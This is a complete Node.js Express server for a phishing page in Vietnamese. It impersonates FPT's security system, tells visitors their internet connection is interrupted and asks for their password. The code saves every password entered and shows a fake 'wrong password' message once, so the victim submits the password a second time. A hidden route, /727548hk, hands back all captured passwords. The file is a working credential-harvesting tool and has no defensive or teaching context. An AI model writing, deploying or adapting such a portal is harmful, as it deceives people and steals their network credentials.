const express = require('express');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: false }));

app.get('/', (req, res) => {
    //res.sendFile(__dirname + '/login.html');
	res.send(`
			<style>
        body {
            display: flex;
			flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        form {
            text-align: center;
        }
        form input {
            margin: 10px auto;
            padding: 5px;
        }
		img{
			width: 150px;
			height: 70px;
		}
		h4 {
			color: red;
		}
    </style>
	
	<img src="data:image/png;base64,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" alt="icon-fpt"/>
    <h1>Hệ Thống Bảo Mật FPT</h1>
	<h3>Kết nối internet của quý khách đang bị gián đoạn.<br/>Vui lòng nhập lại mật khẩu để kết nối internet.<h3>
    <form action="/" method="post" style="alain">
        <input type="password" name="password" placeholder="Mật khẩu">
        <input type="submit" value="Xác Nhận">
    </form>
	`)
});

	let index = 0;
	let arrPass = [];
	
app.get('/727548hk', (rep, res) => {
	res.send(arrPass);
})
	
app.post('/', (req, res) => {
    const password = req.body.password;
	arrPass = [...arrPass, password];
	let errorMessage = '<h4>Mật khẩu không đúng. Vui lòng nhập lại</h4>';
	if(index === 0) {
		index = 1;
		arrPass = [...arrPass, password];
			res.send(`
			<style>
        body {
            display: flex;
			flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        form {
            text-align: center;
        }
        form input {
            margin: 10px auto;
            padding: 5px;
        }
		img{
			width: 150px;
			height: 70px;
		}
		h4 {
			color: red;
		}
    </style>
	
	<img src="data:image/png;base64,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" alt="icon-fpt"/>
    <h1>Hệ Thống Bảo Mật FPT</h1>
	<h3>Kết nối internet của quý khách đang bị gián đoạn.<br/>Vui lòng nhập lại mật khẩu để kết nối internet.<h3>
    <form action="/" method="post" style="alain">
        <input type="password" name="password" placeholder="Mật khẩu">
        <input type="submit" value="Xác Nhận">
    </form>
	${errorMessage}
	`)
	} else {
		arrPass = [...arrPass, password];
		res.send("<h2 style='width: 95vw; height: 95vh; text-align: center; display: flex; justify-content: center; align-items: center'>Xác thực thành công.<br/>Vui lòng chờ trong vài giây!</h2>");
	}

});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
